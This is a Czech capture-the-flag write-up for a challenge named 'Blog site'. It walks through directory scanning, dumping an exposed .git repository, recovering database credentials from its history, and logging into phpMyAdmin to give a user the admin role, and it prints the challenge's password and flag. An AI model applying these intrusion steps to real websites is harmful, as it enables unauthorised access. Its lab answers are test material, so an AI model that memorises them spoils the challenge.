# Blog site

## Zadání

```
Hi, packet inspector,

a simple blog webpage was created where all employees can write their suggestions for improvements. It is one part of the optimization plan designed by our allmighty AI.

Examine the web http://blog.mysterious-delivery.tcc:20000/ and find any interesting information.

May the Packet be with you!
```

## Řešení

### 1. Enumerace

```
dirb http://blog.mysterious-delivery.tcc:20000/
```

```
---- Scanning URL: http://blog.mysterious-delivery.tcc:20000/ ----
+ http://blog.mysterious-delivery.tcc:20000/.git/HEAD (CODE:200|SIZE:23)
+ http://blog.mysterious-delivery.tcc:20000/create (CODE:302|SIZE:209)
+ http://blog.mysterious-delivery.tcc:20000/hello (CODE:200|SIZE:13)
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/javascript/
==> DIRECTORY: http://blog.mysterious-delivery.tcc:20000/phpmyadmin/
+ http://blog.mysterious-delivery.tcc:20000/server-status (CODE:403|SIZE:296)
+ http://blog.mysterious-delivery.tcc:20000/settings (CODE:302|SIZE:209)
```

Na stránce je repositář git a phpmyadmin!

### 2. Stažení git

Na stažení repositáře můžeme použít například GitTools: https://github.com/internetwache/GitTools

```
./gitdumper.sh http://blog.mysterious-delivery.tcc:20000/.git/ blog
```

### 3. Analýza zdrojového kódu

* Zdrojový kód lze prohlížet například pomocí aplikace GitHub desktop (https://desktop.github.com/)
* Původně se jedná o flask tutorial (https://github.com/pallets/flask/tree/main/examples/tutorial)
* Místo SQLite je použito MySQL
* V git historii souboru `db.py` najdeme uložené heslo `56843437e5c747a2c9c08e4b79f109c3` a aktuální uživatelské jméno `attendance` v `__init__.py`
* Vlajka lze zobrazit na stránce `/settings` pokud má uživatel roli `admin`:

```
@bp.route("/settings")
@login_required
def settings():
    """Configure blog"""

    if (not g.user["role"]) or ("admin" not in g.user["role"].split(",")):
        abort(403)

    return render_template("blog/settings.html")
```

### 4. Přihlášení do phpmyadmin:

```
username = attendance
password = 56843437e5c747a2c9c08e4b79f109c3
```

Nastavíme si v tabulce `user` roli `admin` u uživatele, kterého zaregistrujeme na stránce. Vlajku pak přečteme na stránce http://blog.mysterious-delivery.tcc:20000/settings

## Vlajka 

```
FLAG{gDfv-5zlU-spVN-D4Qb}
```